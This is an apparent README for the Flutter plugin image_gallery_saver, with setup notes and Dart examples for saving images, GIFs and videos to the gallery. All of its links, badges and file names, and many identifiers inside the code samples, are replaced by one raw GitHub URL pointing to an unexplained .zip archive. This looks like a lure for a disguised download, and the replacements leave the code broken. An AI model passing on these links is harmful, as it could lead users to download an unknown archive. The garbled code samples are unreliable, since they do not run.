# image_gallery_saver

[![Build Status](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)
[![pub package](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)
[![license](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip)

We use the `image_picker` plugin to select images from the Android and iOS image library, but it can't save images to the gallery. This plugin can provide this feature.

## Usage

To use this plugin, add `image_gallery_saver` as a dependency in your https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip file. For example:
```yaml
dependencies:
  image_gallery_saver: '^2.0.3'
```

## iOS
Your project need create with swift.
Add the following keys to your https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip file, located in <project root>https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip
 * NSPhotoLibraryAddUsageDescription - describe why your app needs permission for the photo library. This is called Privacy - Photo Library Additions Usage Description in the visual editor
 
 ##  Android
 You need to ask for storage permission to save an image to the gallery. You can handle the storage permission using [flutter_permission_handler](https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip).
 In Android version 10, Open the manifest file and add this line to your application tag
 ```
 <application android:requestLegacyExternalStorage="true" .....>
 ```

## Example
Saving an image from the internet, quality and name is option
``` dart
  _saveLocalImage() async {
    RenderRepaintBoundary boundary =
        https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip!.findRenderObject() as RenderRepaintBoundary;
    https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip image = await https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip();
    ByteData? byteData =
        await (https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(format: https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip));
    if (byteData != null) {
      final result =
          await https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip());
      print(result);
    }
  }
  
  _saveNetworkImage() async {
    var response = await Dio().get(
        "https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip%https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip",
        options: Options(responseType: https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip));
    final result = await https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(
        https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip),
        quality: 60,
        name: "hello");
    print(result);
  }
```

Saving file(ig: video/gif/others) from the internet
``` dart
  _saveNetworkGifFile() async {
    var appDocDir = await getTemporaryDirectory();
    String savePath = https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip + "https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip";
    String fileUrl =
        "https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip";
    await Dio().download(fileUrl, savePath);
    final result =
        await https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(savePath, isReturnPathOfIOS: true);
    print(result);
  }

  _saveNetworkVideoFile() async {
    var appDocDir = await getTemporaryDirectory();
    String savePath = https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip + "https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip";
    String fileUrl =
        "https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip";
    await Dio().download(fileUrl, savePath, onReceiveProgress: (count, total) {
      print((count / total * 100).toStringAsFixed(0) + "%");
    });
    final result = await https://raw.githubusercontent.com/soufianebakki/image_gallery_saver/master/Lucentio/image_gallery_saver.zip(savePath);
    print(result);
  }
```
